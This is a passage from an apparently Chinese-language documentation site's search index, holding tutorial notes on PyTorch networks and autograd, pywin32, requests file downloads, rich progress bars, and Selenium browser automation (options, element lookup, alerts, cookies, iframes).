my_tensor.to(device) 是返回一个 my_tensor 的新的拷贝对象， 而不是直接修改 my_tensor 变量，因此你需要将其赋值给一个新的张量，然后使用这个张量。 Pytorch 默认只会采用一个 GPU，因此需要使用多个 GPU，需要采用 DataParallel ，代码如下所示: model = nn.DataParallel(model) 参考: https://zhuanlan.zhihu.com/p/66543791","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pytorch-Example-Training-Classifier.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pytorch-Example-Training-Classifier.html"},{"title":"神经网络","text":"在 PyTorch 中 torch.nn 专门用于实现神经网络。 其中 nn.Module 包含了网络层的搭建， 以及一个方法 forward(input) ，并返回网络的输出 output . 下面是一个经典的 LeNet 网络，用于对字符进行分类 对于神经网络来说，一个标准的训练流程是这样的： 定义一个多层的神经网络 对数据集的预处理并准备作为网络的输入 将数据输入到网络 计算网络的损失 反向传播，计算梯度 更新网络的梯度，一个简单的更新规则是 weight = weight - learning_rate * gradient 定义网络 首先定义一个神经网络，下面是一个 5 层的卷积神经网络， 包含两层卷积层和三层全连接层: import torch import torch.nn as nn import torch.nn.functional as F class Net(nn.Module): def __init__(self): super(Net, self).__init__() # 输入图像是单通道，conv1 kenrnel size=5*5，输出通道 6 self.conv1 = nn.Conv2d(1, 6, 5) # conv2 kernel size=5*5, 输出通道 16 self.conv2 = nn.Conv2d(6, 16, 5) # 全连接层 self.fc1 = nn.Linear(16*5*5, 120) self.fc2 = nn.Linear(120, 84) self.fc3 = nn.Linear(84, 10) def forward(self, x): # max-pooling 采用一个 (2,2) 的滑动窗口 x = F.max_pool2d(F.relu(self.conv1(x)), (2, 2)) # 核(kernel)大小是方形的话，可仅定义一个数字，如 (2,2) 用 2 即可 x = F.max_pool2d(F.relu(self.conv2(x)), 2) x = x.view(-1, self.num_flat_features(x)) x = F.relu(self.fc1(x)) x = F.relu(self.fc2(x)) x = self.fc3(x) return x def num_flat_features(self, x): # 除了 batch 维度外的所有维度 size = x.size()[1:] num_features = 1 for s in size: num_features *= s return num_features net = Net() print(net) 打印网络结构: Net( (conv1): Conv2d(1, 6, kernel_size=(5, 5), stride=(1, 1)) (conv2): Conv2d(6, 16, kernel_size=(5, 5), stride=(1, 1)) (fc1): Linear(in_features=400, out_features=120, bias=True) (fc2): Linear(in_features=120, out_features=84, bias=True) (fc3): Linear(in_features=84, out_features=10, bias=True) ) 这里必须实现 forward 函数， 而 backward 函数在采用 autograd 时就自动定义好了， 在 forward 方法可以采用任何的张量操作。 net.parameters() 可以返回网络的训练参数，使用例子如下: params = list(net.parameters()) print('参数数量: ', len(params)) # conv1.weight print('第一个参数大小: ', params[0].size()) 输出: 参数数量: 10 第一个参数大小: torch.Size([6, 1, 5, 5]) 然后简单测试下这个网络，随机生成一个 32*32 的输入: # 随机定义一个变量输入网络 input = torch.randn(1, 1, 32, 32) out = net(input) print(out) 输出结果: tensor([[ 0.1005, 0.0263, 0.0013, -0.1157, -0.1197, -0.0141, 0.1425, -0.0521, 0.0689, 0.0220]], grad_fn=<ThAddmmBackward>) 接着反向传播需要先清空梯度缓存，并反向传播随机梯度: # 清空所有参数的梯度缓存，然后计算随机梯度进行反向传播 net.zero_grad() out.backward(torch.randn(1, 10)) 注解 torch.nn 只支持小批量(mini-batches)数据，也就是输入不能是单个样本， 比如对于 nn.Conv2d 接收的输入是一个 4 维张量--nSamples * nChannels * Height * Width 。 所以，如果你输入的是单个样本，需要采用 input.unsqueeze(0) 来扩充一个假的 batch 维度，即从 3 维变为 4 维。 损失函数 损失函数的输入是 (output, target) ，即网络输出和真实标签对的数据， 然后返回一个数值表示网络输出和真实标签的差距。 PyTorch 中其实已经定义了不少的损失函数， 这里仅采用简单的均方误差：nn.MSELoss ，例子如下: output = net(input) # 定义伪标签 target = torch.randn(10) # 调整大小，使得和 output 一样的 size target = target.view(1, -1) criterion = nn.MSELoss() loss = criterion(output, target) print(loss) 输出如下: tensor(0.6524, grad_fn=<MseLossBackward>) 这里，整个网络的数据输入到输出经历的计算图如下所示，其实也就是数据从输入层到输出层，计算 loss 的过程: input -> conv2d -> relu -> maxpool2d -> conv2d -> relu -> maxpool2d -> view -> linear -> relu -> linear -> relu -> linear -> MSELoss -> loss 如果调用 loss.backward() ，那么整个图都是可微分的， 也就是说包括 loss ，图中的所有张量变量， 只要其属性 requires_grad=True ，那么其梯度 .grad张量都会随着梯度一直累计。 用代码来说明: # MSELoss print(loss.grad_fn) # Linear layer print(loss.grad_fn.next_functions[0][0]) # Relu print(loss.grad_fn.next_functions[0][0].next_functions[0][0]) 输出: <MseLossBackward object at 0x0000019C0C349908> <ThAddmmBackward object at 0x0000019C0C365A58> <ExpandBackward object at 0x0000019C0C3659E8> 反向传播 反向传播的实现只需要调用 loss.backward() 即可， 当然首先需要清空当前梯度缓存，即.zero_grad() 方法， 否则之前的梯度会累加到当前的梯度，这样会影响权值参数的更新。 下面是一个简单的例子，以 conv1 层的偏置参数 bias 在反向传播前后的结果为例: # 清空所有参数的梯度缓存 net.zero_grad() print('conv1.bias.grad before backward') print(net.conv1.bias.grad) loss.backward() print('conv1.bias.grad after backward') print(net.conv1.bias.grad) 输出结果: conv1.bias.grad before backward tensor([0., 0., 0., 0., 0., 0.]) conv1.bias.grad after backward tensor([ 0.0069, 0.0021, 0.0090, -0.0060, -0.0008, -0.0073]) 更新权重 采用随机梯度下降(Stochastic Gradient Descent, SGD)方法的最简单的更新权重规则如下: weight = weight - learning_rate * gradient 按照这个规则，代码实现如下所示: # 简单实现权重的更新例子 learning_rate = 0.01 for f in net.parameters(): f.data.sub_(f.grad.data * learning_rate) 但是这只是最简单的规则，深度学习有很多的优化算法， 不仅仅是 SGD，还有 Nesterov-SGD, Adam, RMSProp 等等，为了采用这些不同的方法， 这里采用 torch.optim 库，使用例子如下所示: import torch.optim as optim # 创建优化器 optimizer = optim.SGD(net.parameters(), lr=0.01) # 在训练过程中执行下列操作 optimizer.zero_grad() # 清空梯度缓存 output = net(input) loss = criterion(output, target) loss.backward() # 更新权重 optimizer.step() 注意，同样需要调用 optimizer.zero_grad() 方法清空梯度缓存。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pytorch-Neural-Networks.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pytorch-Neural-Networks.html"},{"title":"autograd-自动梯度","text":"提供了对 Tensors 上所有运算操作的自动微分功能，也就是计算梯度的功能。 它属于 define-by-run 类型框架，即反向传播操作的定义是根据代码的运行方式，因此每次迭代都可以是不同的。 Tensor梯度计算 torch.Tensor 是 Pytorch 最主要的库， 当设置它的属性 .requires_grad=True， 那么就会开始追踪在该变量上的所有操作，而完成计算后， 可以调用 .backward() 并自动计算所有的梯度，得到的梯度都保存在属性 .grad 中。 调用 .detach() 方法分离出计算的历史， 可以停止一个 tensor 变量继续追踪其历史信息 ，同时也防止未来的计算会被追踪。 而如果是希望防止跟踪历史（以及使用内存），可以将代码块放在 with torch.no_grad(): 内， 这个做法在使用一个模型进行评估的时候非常有用， 因为模型会包含一些带有 requires_grad=True 的训练参数，但实际上并不需要它们的梯度信息。 对于 autograd 的实现，还有一个类也是非常重要-- Function 。 Tensor 和 Function 两个类是有关联并建立了一个非循环的图， 可以编码一个完整的计算记录。 每个 tensor 变量都带有属性 .grad_fn ， 该属性引用了创建了这个变量的 Function （除了由用户创建的 Tensors，它们的 grad_fn=None )。 如果要进行求导运算，可以调用一个 Tensor 变量的方法 .backward() 。 如果该变量是一个标量，即仅有一个元素， 那么不需要传递任何参数给方法 .backward()， 当包含多个元素的时候，就必须指定一个 gradient 参数，表示匹配尺寸大小的 tensor， 如: import torch # 开始创建一个 tensor， 并让 requires_grad=True 来追踪该变量相关的计算操作： x = torch.ones(2, 2, requires_grad=True) print(x) # tensor([[1., 1.], # [1., 1.]], requires_grad=True) # 执行任意计算操作，这里进行简单的加法运算： y = x + 2 print(y) # tensor([[3., 3.], # [3., 3.]], grad_fn=<AddBackward>) # y 是一个操作的结果，所以它带有属性 grad_fn： print(y.grad_fn) # <AddBackward object at 0x00000216D25DCC88> # 继续对变量 y 进行操作： z = y * y * 3 out = z.mean() print('z=', z) # z= tensor([[27., 27.], # [27., 27.]], grad_fn=<MulBackward>) print('out=', out) # out= tensor(27., grad_fn=<MeanBackward1>) 注解 实际上，一个 Tensor 变量的默认 requires_grad 是 False ， 可以像上述定义一个变量时候指定该属性是 True， 当然也可以定义变量后，调用 .requires_grad_(True) 设置为 True ， 这里带有后缀 _ 是会改变变量本身的属性 如: a = torch.randn(2, 2) a = ((a * 3) / (a - 1)) print(a.requires_grad) # False a.requires_grad_(True) print(a.requires_grad) # True b = (a * a).sum() print(b.grad_fn) # <SumBackward0 object at 0x00000216D25ED710> 反向传播: out.backward() # 输出梯度 d(out)/dx print(x.grad) # tensor([[4.5000, 4.5000], [4.5000, 4.5000]]) 上面的out计算过程: 定义 x 为 2*2 的 1 y = x + 2 z = y * y * 3 = 3 * (x+2)&#94;2 求导就是 每个 X 都是1. 从数学上来说，如果你有一个向量值函数: 那么对应的梯度是一个雅克比矩阵(Jacobian matrix) 一般来说，torch.autograd 就是用于计算雅克比向量(vector-Jacobian)乘积的工具。 这里略过数学公式，直接上代码例子介绍: x = torch.randn(3, requires_grad=True) y = x * 2 while y.data.norm() < 1000: y = y * 2 print(y) 输出结果: tensor([ 237.5009, 1774.2396, 274.0625], grad_fn=<MulBackward>) 这里得到的变量 y 不再是一个标量，torch.autograd 不能直接计算完整的雅克比行列式， 但我们可以通过简单的传递向量给 backward() 方法作为参数得到雅克比向量的乘积， 例子如下所示: v = torch.tensor([0.1, 1.0, 0.0001], dtype=torch.float) y.backward(v) print(x.grad) 输出结果: tensor([ 102.4000, 1024.0000, 0.1024]) 最后，加上 with torch.no_grad() 就可以停止追踪变量历史进行自动梯度计算: print(x.requires_grad) print((x ** 2).requires_grad) with torch.no_grad(): print((x ** 2).requires_grad) 输出结果: True True False","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pytorch-autoGrad.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pytorch-autoGrad.html"},{"title":"pywin32","text":"pypi地址:: pywin32 安装: python -m pip install --upgrade pywin32 这下面包含的包有点多, 都是针对与windows的. 其他平台无法安装 Win32gui: Windows图形界面接口模块。主要负责操作窗口切换以及窗口中元素id标签的获取 Win32api: Windows开发接口模块。主要负责模拟键盘和鼠标操作,对win32gui获取的标签进行点击/获取值/修改值等操作 Win32con: 全面的库函数，提供Win32gui和Win32api需要的操作参数 win32event: 提供 互斥锁, 信号相关 windows Api . 参见: github/wuxc/pywin32doc/win32event win32event CreateMutex 可参见: microsoft-createmutexa ReleaseMutex 释放互斥体","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pywin32.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pywin32.html"},{"title":"redis","text":"","tags":"数据库","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-redis.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-redis.html"},{"title":"requests","text":"下载文件 小文件 小文件: import requests url = \"http://www.test.com/xxxxx/test.jpg\" path = r\"c:\\test.jpg\" req = requests.get(url) with open(path, \"wb\") as f: f.write(req.content) 大文件 断点续传: import sys import requests import os class Downloader(object): def __init__(self, url, file_path): self.url = url self.file_path = file_path def start(self): res_length = requests.get(self.url, stream=True) total_size = int(res_length.headers['Content-Length']) print(res_length.headers) print(res_length) if os.path.exists(self.file_path): temp_size = os.path.getsize(self.file_path) print(\"当前：%d 字节， 总：%d 字节， 已下载：%2.2f%% \" % (temp_size, total_size, 100 * temp_size / total_size)) else: temp_size = 0 print(\"总：%d 字节，开始下载...\" % (total_size,)) headers = {'Range': 'bytes=%d-' % temp_size, \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0\"} res_left = requests.get(self.url, stream=True, headers=headers) with open(self.file_path, \"ab\") as f: for chunk in res_left.iter_content(chunk_size=1024): temp_size += len(chunk) f.write(chunk) f.flush() done = int(50 * temp_size / total_size) sys.stdout.write(\"\\r[%s%s] %d%%\" % ('█' * done, ' ' * (50 - done), 100 * temp_size / total_size)) sys.stdout.flush() if __name__ == '__main__': url = \"http://www.test.com/xxxxx/test.jpg\" path = r\"c:\\test.jpg\" downloader = Downloader(url, path) downloader.start() 注解 若文件下载 url 存在重定向, 则使用 allow_redirects=True requests.get(url, allow_redirects=True) 分块下载使用 stream=True requests.get(url, stream=True) 断点续传需要指定 headers 下的 Range 字段 来指定范围 # 或者 headers = {'Range': 'bytes=%d-'%(start,)} headers = {'Range': 'bytes=%d-%d'%(start,end)} 关于文件下载时候的路径 当从一个url下载文件时候, 若使用绝对路径, 不会有问题. 但可能有时候不想使用绝对路径, 而是使用相对路径, 那么这个时候可能就会 存在给定的下载路径正确, 但就是说路径不存在, 下载不了, 也没发使用python执行(若是可执行文件). 这个时候可能是文件名的命名使用了url编码的缘故, 而其中可能有些特殊字符不能被python正常解析, 故而导致的这个问题 将名称使用url解码即可: urllib.parse.unquote(url_path)","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-requests.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-requests.html"},{"title":"rich","text":"关于进度条可参见: ProgressInPy 安装: pip install rich 与 /docs/后端/python/python三方库/tqdm 一起弄彩色进度条: from tqdm.rich import tqdm, trange def print_hi(): n = 10000 for i in trange(n): for j in range(n): j += i 效果","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-rich.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-rich.html"},{"title":"Actions接口","text":"参考: https://www.selenium.dev/zh-cn/documentation/webdriver/actions_api/","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-selenium-Actions-interface.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-selenium-Actions-interface.html"},{"title":"浏览器加载选项","text":"pageLoadStrategy 页面加载策略: 策略 就绪状态 备注 normal complete 默认值, 等待所有资源下载 eager interactive DOM 访问已准备就绪, 但诸如图像的其他资源可能仍在加载 none Any 完全不会阻塞 WebDriver 示例(Options): from selenium import webdriver from selenium.webdriver.chrome.options import Options options = Options() # 阻塞等待页面资源加载 options.page_load_strategy = 'normal' # WebDriver一直等到 DOMContentLoaded 事件触发并返回. # options.page_load_strategy = 'eager' # WebDriver 仅等待初始页面已下载. # options.page_load_strategy = 'none' driver = webdriver.Chrome(options=options) driver.get(\"http://www.google.com\") driver.quit() platformName 标识了远端的操作系统, 获取 platformName 将返回操作系统的名称 acceptInsecureCerts 检查在会话期间导航时 是否使用了过期的 (或) 无效的 TLS Certificate 如果将功能设置为 false, 则页面浏览遇到任何域证书问题时, 将返回insecure certificate error . 如果设置为 true, 则浏览器将信任无效证书. 默认情况下, 此功能将信任所有自签名证书. 设置后, acceptInsecureCerts 功能将在整个会话中生效. timeouts WebDriver session 具有一定的 session timeout 间隔, 在此间隔内, 用户可以控制执行脚本或从浏览器检索信息的行为. 每个会话超时都配置有不同 timeouts 的组合, 如下所述: Script Timeout: 指定在当前浏览上下文中, 中断正在执行脚本的时机. WebDriver创建新会话时, 将设置默认的超时时间为 30,000 . Page Load Timeout: 指定在当前浏览上下文中, 加载网页的时间间隔. WebDriver创建新会话时, 默认设置超时时间为 300,000 . 如果页面加载限制了给定 (或默认) 的时间范围, 则该脚本将被 TimeoutException 停止. Implicit Wait Timeout 指定在定位元素时, 等待隐式元素定位策略的时间. WebDriver创建新会话时, 将设置默认超时时间为 0 . unhandledPromptBehavior 指定当前会话 user prompt handler 的状态. 默认为 dismiss and notify state . User Prompt Handler 这定义了在远端出现用户提示时必须采取的措施. 该行为由unhandledPromptBehavior 功能定义, 具有以下状态: dismiss accept dismiss and notify accept and notify ignore setWindowRect 用于所有支持 调整大小和重新定位 命令 的远程终端. strictFileInteractability 用于是否对 类型为文件的输入(input type=file) 元素进行严格的交互性检查. 默认关闭严格性检查, 在将 元素的Send Keys 方法作用于隐藏的文件上传时, 会有控制方面的行为区别. proxy 代理服务器充当客户端和服务器之间的请求中介. 简述而言, 流量将通过代理服务器流向您请求的地址, 然后返回. 使用代理服务器用于Selenium的自动化脚本, 可能对以下方面有益: 捕获网络流量 模拟网站后端响应 在复杂的网络拓扑结构或严格的公司限制/政策下访问目标站点. 如果您在公司环境中, 并且浏览器无法连接到URL, 则最有可能是因为环境, 需要借助代理进行访问. 设置代理的方式: from selenium import webdriver PROXY = \"<HOST:PORT>\" webdriver.DesiredCapabilities.FIREFOX['proxy'] = { \"httpProxy\": PROXY, \"ftpProxy\": PROXY, \"sslProxy\": PROXY, \"proxyType\": \"MANUAL\", } with webdriver.Firefox() as driver: # Open URL driver.get(\"https://selenium.dev\")","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-selenium-Browser-loading-option.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-selenium-Browser-loading-option.html"},{"title":"元素支持","text":"文件上传 不能直接与上传的Dialog交互, 不过对于 input 标签的上传, 可以设置路径: file_input = driver.find_element(By.CSS_SELECTOR, \"input[type='file']\") file_input.send_keys(upload_file) driver.find_element(By.ID, \"file-submit\").click() 元素查找 对于以下内容而言: <ol id=\"vegetables\"> <li class=\"potatoes\">… <li class=\"onions\">… <li class=\"tomatoes\"><span>Tomato is a Vegetable</span>… </ol> <ul id=\"fruits\"> <li class=\"bananas\">… <li class=\"apples\">… <li class=\"tomatoes\"><span>Tomato is a Fruit</span>… </ul> 查询某一个标签, 只会 返回第一个匹配的元素 : vegetable = driver.find_element(By.CLASS_NAME, \"tomatoes\") 可以通过 子元素查找 : fruits = driver.find_element(By.ID, \"fruits\") fruit = fruits.find_element(By.CLASS_NAME,\"tomatoes\") 优化, 可以直接使用 CSS选择器 fruit = driver.find_element(By.CSS_SELECTOR,\"#fruits .tomatoes\") 若需要 查找所有元素 , 使用 复数形式(find_elements) 查找: plants = driver.find_elements(By.TAG_NAME, \"li\") 获取当前 激活/聚焦的元素 from selenium import webdriver from selenium.webdriver.common.by import By driver = webdriver.Chrome() driver.get(\"https://www.google.com\") driver.find_element(By.CSS_SELECTOR, '[name=\"q\"]').send_keys(\"webElement\") # Get attribute of current active element attr = driver.switch_to.active_element.get_attribute(\"title\") print(attr) Web元素交互 仅有五种基本命令可用于元素的操作: 点击 (适用于任何元素) 元素点击命令 执行在 元素中央. 如果元素中央由于某些原因被 遮挡 , Selenium将返回一个 元素点击中断 错误.: # Navigate to url driver.get(\"https://www.selenium.dev/selenium/web/inputs.html\") # Click on the element driver.find_element(By.NAME, \"color_input\").click() 发送键位 (仅适用于文本字段和内容可编辑元素) 元素发送键位命令 将录入提供的键位到 可编辑的 元素. 通常, 这意味着元素是具有 文本 类型的表单的输入元素或具有 内容可编辑 属性的元素. 如果不可编辑, 则返回 无效元素状态 错误.: # Navigate to url driver.get(\"https://www.selenium.dev/selenium/web/inputs.html\") # Clear field to empty it from any previous data driver.find_element(By.NAME, \"email_input\").clear() # Enter Text driver.find_element(By.NAME, \"email_input\").send_keys(\"admin@localhost.dev\" ) 清除 (仅适用于文本字段和内容可编辑元素) 元素清除命令 重置元素的内容 . 这要求元素 可编辑 , 且 可重置 . 通常, 这意味着元素是具有 文本 类型的表单的输入元素或具有 内容可编辑 属性的元素. 如果不满足这些条件, 将返回 无效元素状态 错误.: # Navigate to url driver.get(\"https://www.selenium.dev/selenium/web/inputs.html\") # Clear field to empty it from any previous data driver.find_element(By.NAME, \"email_input\").clear() 提交 (仅适用于表单元素) 在Selenium 4中, 不再通过单独的端点以及脚本执行的方法来实现. 因此, 建议不要使用此方法, 而是单击相应的表单提交按钮. 选择 (参见 选择列表元素) 设计目的是尽量模拟用户体验, 会事先做以下事情: 如果它确定元素在视口之外, 则会将元素滚动到视图中, 特别是将元素底部与视口底部对齐 确保元素在执行操作之前是可交互的 . 这可能意味着滚动不成功, 或者该元素没有以其他方式显示. 确定某个元素是否显示在页面上太难了 无法直接在webdriver规范中定义, 因此Selenium发送一个带有JavaScript原子的执行命令, 检查是否有可能阻止该元素显示. 如果确定某个元素不在视口中, 不显示, 不可 键盘交互, 或不可 指针交互, 则返回一个元素不可交互 错误 元素定位策略 在 WebDriver 中有 8 种不同的内置元素定位策略： 定位器 Locator 描述 class name 定位class属性与搜索值匹配的元素（不允许使用复合类名） css selector 定位 CSS 选择器匹配的元素 id 定位 id 属性与搜索值匹配的元素 name 定位 name 属性与搜索值匹配的元素 link text 定位link text可视文本与搜索值 完全匹配 的锚元素. 如 href 标签内的文本 partial link text 定位link text可视文本部分与搜索值 部分匹配 的锚点元素。如果匹配多个元素，则只选择第一个元素。 tag name 定位标签名称与搜索值匹配的元素 xpath 定位与 XPath 表达式匹配的元素 相对定位器 4.0提供新功能. 假设有一个登陆界面: 由于某些原因不方便直接定位 邮箱 元素, 那么可以通过下面的 密码 元素定位: email_locator = locate_with(By.TAG_NAME, \"input\").above({By.ID: \"password\"}) 支持以下: Above, 某元素上方 Below, 某元素下方: password_locator = locate_with(By.TAG_NAME, \"input\").below({By.ID: \"email\"}) Left of, 代码中是 to_left_of :: cancel_locator = locate_with(By.TAG_NAME, \"button\").to_left_of({By.ID: \"submit\"}) Right of, to_right_of :: submit_locator = locate_with(By.TAG_NAME, \"button\").to_right_of({By.ID: \"cancel\"}) Near, email_locator = locate_with(By.TAG_NAME, \"input\").near({By.ID: \"lbl-email\"}) 支持链式调用: submit_locator = locate_with(By.TAG_NAME, \"button\").below({By.ID: \"email\"}).to_right_of({By.ID: \"cancel\"}) 网络元素的信息 参考: https://www.selenium.dev/zh-cn/documentation/webdriver/elements/information/ 支持以下查询: 是否显示: # Navigate to the url driver.get(\"https://www.selenium.dev/selenium/web/inputs.html\") # Get boolean value for is element display is_email_visible = driver.find_element(By.NAME, \"email_input\").is_displayed() 是否启用: # Navigate to url driver.get(\"https://www.selenium.dev/selenium/web/inputs.html\") # Returns true if element is enabled else returns false value = driver.find_element(By.NAME, 'button_input').is_enabled() 是否被选定: # Navigate to url driver.get(\"https://www.selenium.dev/selenium/web/inputs.html\") # Returns true if element is checked else returns false value = driver.find_element(By.NAME, \"checkbox_input\").is_selected() 获取元素标签名: # Navigate to url driver.get(\"https://www.selenium.dev/selenium/web/inputs.html\") # Returns TagName of the element attr = driver.find_element(By.NAME, \"email_input\").tag_name 获取参照元素的尺寸和坐标, 数据主体包含以下详细信息： 元素左上角的X轴位置 元素左上角的y轴位置 元素的高度 元素的宽度 例: # Navigate to url driver.get(\"https://www.selenium.dev/selenium/web/inputs.html\") # Returns height, width, x and y coordinates referenced element res = driver.find_element(By.NAME, \"range_input\").rect 获取元素CSS值 # Navigate to Url driver.get('https://www.selenium.dev/selenium/web/colorPage.html') # Retrieves the computed style property 'color' of linktext cssValue = driver.find_element(By.ID, \"namedColor\").value_of_css_property('background-color') 获取特定元素渲染后的文本内容: # Navigate to url driver.get(\"https://www.selenium.dev/selenium/web/linked_image.html\") # Retrieves the text of the element text = driver.find_element(By.ID, \"justanotherlink\").text 获取特性或属性: # Navigate to the url driver.get(\"https://www.selenium.dev/selenium/web/inputs.html\") # Identify the email text box email_txt = driver.find_element(By.NAME, \"email_input\") # Fetch the value property associated with the textbox value_info = email_txt.get_attribute(\"value\")","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-selenium-Element-support.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-selenium-Element-support.html"},{"title":"Grid-并行支持","text":"参考: https://www.selenium.dev/zh-cn/documentation/grid/","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-selenium-Grid-parallel-support.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-selenium-Grid-parallel-support.html"},{"title":"安装","text":"Python的安装: pip install selenium 其他语言的安装参考: https://www.selenium.dev/zh-cn/documentation/webdriver/getting_started/install_library/ 如Java的 pom.xml : <dependency> <groupId>org.seleniumhq.selenium</groupId> <artifactId>selenium-java</artifactId> <version>4.15.0</version> </dependency>","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-selenium-Install.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-selenium-Install.html"},{"title":"交互","text":"获取浏览器信息 获取标题 从浏览器中读取当前页面的标题: driver.title 获取当前 URL: driver.current_url 浏览器导航 启动浏览器后的第一件事就是打开网站: // 简便的方法 driver.get(\"https://selenium.dev\"); // 更长的方法 driver.navigate().to(\"https://selenium.dev\"); 按下浏览器的后退按钮: driver.navigate().back(); 按下浏览器的前进键: driver.navigate().forward(); 刷新页面: driver.navigate().refresh(); 警告框 Alerts 警告框 其中最基本的称为警告框, 它显示一条自定义消息, 以及一个用于关闭该警告的按钮, 在大多数浏览器中标记为\"确定\"(OK). 在大多数浏览器中, 也可以通过按\"关闭\"(close)按钮将其关闭, 但这始终与\"确定\"按钮具有相同的作用 WebDriver可以从弹窗获取文本并接受或关闭这些警告.: # Click the link to activate the alert driver.find_element(By.LINK_TEXT, \"See an example alert\").click() # Wait for the alert to be displayed and store it in a variable alert = wait.until(expected_conditions.alert_is_present()) # Store the alert text in a variable text = alert.text # Press the OK button alert.accept() Confirm 确认框 确认框类似于警告框, 不同之处在于用户还可以选择取消消息. 此示例还呈现了警告的另一种实现: # Click the link to activate the alert driver.find_element(By.LINK_TEXT, \"See a sample confirm\").click() # Wait for the alert to be displayed wait.until(expected_conditions.alert_is_present()) # Store the alert in a variable for reuse alert = driver.switch_to.alert # Store the alert text in a variable text = alert.text # Press the Cancel button alert.dismiss() Prompt 提示框 提示框与确认框相似, 不同之处在于它们还包括文本输入. 与处理表单元素类似, 您可以使用WebDriver的sendKeys来填写响应. 这将完全替换占位符文本. 按下取消按钮将不会提交任何文本: # Click the link to activate the alert driver.find_element(By.LINK_TEXT, \"See a sample prompt\").click() # Wait for the alert to be displayed wait.until(expected_conditions.alert_is_present()) # Store the alert in a variable for reuse alert = Alert(driver) # Type your message alert.send_keys(\"Selenium\") # Press the OK button alert.accept() cookies Cookie是从网站发送并存储在您的计算机中的一小段数据. Cookies主要用于识别用户并加载存储的信息. WebDriver API提供了一种使用内置的方法与Cookie进行交互: 添加 Cookie 这个方法常常用于将cookie添加到当前访问的上下文中. 添加Cookie仅接受一组已定义的可序列化JSON对象 首先, 您需要位于有效Cookie的域上. 如果您在开始与网站进行交互之前尝试预设cookie, 并且您的首页很大或需要一段时间才能加载完毕, 则可以选择在网站上找到一个较小的页面: from selenium import webdriver driver = webdriver.Chrome() driver.get(\"http://www.example.com\") # Adds the cookie into current browser context driver.add_cookie({\"name\": \"key\", \"value\": \"value\"}) 获取命名的 Cookie 此方法返回与cookie名称匹配的序列化cookie数据中所有关联的cookie.: from selenium import webdriver driver = webdriver.Chrome() # Navigate to url driver.get(\"http://www.example.com\") # Adds the cookie into current browser context driver.add_cookie({\"name\": \"foo\", \"value\": \"bar\"}) # Get cookie details with named cookie 'foo' print(driver.get_cookie(\"foo\")) 获取全部 Cookies 此方法会针对当前访问上下文返回\"成功的序列化cookie数据\". 如果浏览器不再可用, 则返回错误.: from selenium import webdriver driver = webdriver.Chrome() # Navigate to url driver.get(\"http://www.example.com\") driver.add_cookie({\"name\": \"test1\", \"value\": \"cookie1\"}) driver.add_cookie({\"name\": \"test2\", \"value\": \"cookie2\"}) # Get all available cookies print(driver.get_cookies()) 删除 Cookie 此方法删除与提供的cookie名称匹配的cookie数据.: from selenium import webdriver driver = webdriver.Chrome() # Navigate to url driver.get(\"http://www.example.com\") driver.add_cookie({\"name\": \"test1\", \"value\": \"cookie1\"}) driver.add_cookie({\"name\": \"test2\", \"value\": \"cookie2\"}) # Delete a cookie with name 'test1' driver.delete_cookie(\"test1\") 删除所有 Cookies 此方法删除当前访问上下文的所有cookie.: from selenium import webdriver driver = webdriver.Chrome() # Navigate to url driver.get(\"http://www.example.com\") driver.add_cookie({\"name\": \"test1\", \"value\": \"cookie1\"}) driver.add_cookie({\"name\": \"test2\", \"value\": \"cookie2\"}) # Deletes all cookies driver.delete_all_cookies() Same-Site Cookie属性 此属性允许用户引导浏览器控制cookie, 是否与第三方站点发起的请求一起发送. 引入其是为了防止CSRF（跨站请求伪造）攻击. Same-Site cookie属性接受以下两种参数作为指令: Strict: 当sameSite属性设置为 Strict, cookie不会与来自第三方网站的请求一起发送. Lax: 当您将cookie sameSite属性设置为 Lax, cookie将与第三方网站发起的GET请求一起发送. 注意: 到目前为止, 此功能已在Chrome(80+版本), Firefox(79+版本)中提供, 并适用于Selenium 4以及更高版本. 用例: from selenium import webdriver driver = webdriver.Chrome() driver.get(\"http://www.example.com\") # Adds the cookie into current browser context with sameSite 'Strict' (or) 'Lax' driver.add_cookie({\"name\": \"foo\", \"value\": \"value\", 'sameSite': 'Strict'}) driver.add_cookie({\"name\": \"foo1\", \"value\": \"value\", 'sameSite': 'Lax'}) cookie1 = driver.get_cookie('foo') cookie2 = driver.get_cookie('foo1') print(cookie1) print(cookie2) 与IFrames和frames一起工作 框架是一种现在已被弃用的方法，用于从同一域中的多个文档构建站点布局。 除非你使用的是 HTML5 之前的 webapp，否则你不太可能与他们合作。 内嵌框架允许插入来自完全不同领域的文档，并且仍然经常使用。 如果您需要使用框架或 iframe, WebDriver 允许您以相同的方式使用它们。 考虑 iframe 中的一个按钮。 如果我们使用浏览器开发工具检查元素，我们可能会看到以下内容: <div id=\"modal\"> <iframe id=\"buttonframe\"name=\"myframe\"src=\"https://seleniumhq.github.io\"> <button>Click here</button> </iframe> </div> 如果不是 iframe，我们可能会使用如下方式点击按钮: // 这不会工作 driver.find_element(By.TAG_NAME, 